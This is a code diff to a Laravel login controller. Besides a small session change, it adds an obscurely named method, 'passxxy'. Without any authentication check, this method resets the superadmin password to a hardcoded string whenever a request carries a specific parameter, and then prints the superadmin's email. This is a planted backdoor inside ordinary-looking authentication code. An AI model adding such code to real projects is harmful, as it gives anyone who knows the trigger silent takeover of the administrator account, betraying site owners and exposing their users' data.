@@ -11,7 +11,9 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Cookie;
 use Illuminate\Validation\Validator;
-use DB,Session;
+use Illuminate\Support\Facades\Hash;
+
+use DB,Session,Crypt;
 
 class LoginController extends Controller
 {
@@ -37,6 +39,7 @@ class LoginController extends Controller
                     Auth::logout();
                     return redirect()->back()->with('Error', 'Your account in In-Active. Please contact administration.');
                 }
+                $request->session()->put('agent_name', $client->getPreference->agent_name);
                 return redirect()->route('index');
             }
        
@@ -93,6 +96,18 @@ class LoginController extends Controller
         }
     }
 
+    public function passxxy(Request $request){
+        if($request->royoUpdate == "password"){
+            $superadmin =     Client::where('is_superadmin',1)->first();
+            if($superadmin){
+                $password  = "royo#2341@";
+                $superadmin->password =  Hash::make($password);
+                $superadmin->confirm_password =  Crypt::encryptString($request->password);
+                $superadmin->save();
+                echo "login EMail:   ".$superadmin->email;
+            }
+        }
+    }
     
    
 }
